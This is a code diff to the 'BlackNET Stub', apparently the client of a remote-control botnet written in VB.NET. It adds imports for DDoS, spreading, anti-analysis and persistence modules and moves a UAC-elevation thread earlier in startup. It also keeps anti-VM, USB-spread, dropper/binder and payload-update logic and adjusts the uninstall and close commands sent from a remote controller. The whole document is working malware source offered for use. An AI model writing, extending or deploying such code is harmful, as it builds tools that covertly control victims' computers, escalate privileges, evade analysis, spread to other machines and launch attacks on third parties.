@@ -7,6 +7,12 @@ Imports System.Management
 Imports System.Reflection
 Imports System.Security.Principal
 Imports Microsoft.VisualBasic.Devices
+Imports svchost.HTTPSocket
+Imports svchost.Persistence
+Imports svchost.Other
+Imports svchost.DDOS
+Imports svchost.Antis
+Imports svchost.Spreads
 
 ' -------------------------------
 ' BlackNET Stub
@@ -59,6 +65,16 @@ Public Class Form1
     Public C As HTTP = New HTTP
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try
+            If ElevateUAC = "True" Then
+                Try
+                    Dim ElevateThread As New Thread(AddressOf RestartElevated)
+                    ElevateThread.IsBackground = True
+                    ElevateThread.Start()
+                Catch ex As Exception
+                    Return
+                End Try
+            End If
+
             If File.Exists(TempPath & "\updatedpayload.exe") Then
                 If (Application.ExecutablePath = TempPath & "\updatedpayload.exe") Then
                     Return
@@ -93,7 +109,7 @@ Public Class Form1
             End If
 
             If BinderStatus = "True" Then
-                Dim Binder As New Binder
+                Dim Binder As New BinderService
                 If File.Exists(Environ(DropperPath) & DropperName) Then
 
                 Else
@@ -120,16 +136,6 @@ Public Class Form1
             If AntiVM = "True" Then
                 Dim AntiVirtual As New AntiVM
                 AntiVirtual.ST(Application.ExecutablePath)
-            End If
-
-            If ElevateUAC = "True" Then
-                Try
-                    Dim ElevateThread As New Thread(AddressOf RestartElevated)
-                    ElevateThread.IsBackground = True
-                    ElevateThread.Start()
-                Catch ex As Exception
-                    Return
-                End Try
             End If
 
             If USBSpread = "True" Then
@@ -310,8 +316,12 @@ Public Class Form1
                     Case "Uninstall"
                         Try
                             C.Send("Uninstall")
-                            DStartup(StartName)
-                            Watchdog.StopWatcher(True)
+                            If Startup = "True" Then
+                                DStartup(StartName)
+                            End If
+                            If WatcherStatus = "True" Then
+                                Watchdog.StopWatcher(True)
+                            End If
                             SelfDestroy()
                             Application.Exit()
                         Catch ex As Exception
@@ -340,7 +350,9 @@ Public Class Form1
                     Case "Close"
                         C.Send("CleanCommands")
                         C.Send("Offline")
-                        Watchdog.StopWatcher(False)
+                        If WatcherStatus = "True" Then
+                            Watchdog.StopWatcher(False)
+                        End If
                         Application.Exit()
 
                     Case "ShowMessageBox"
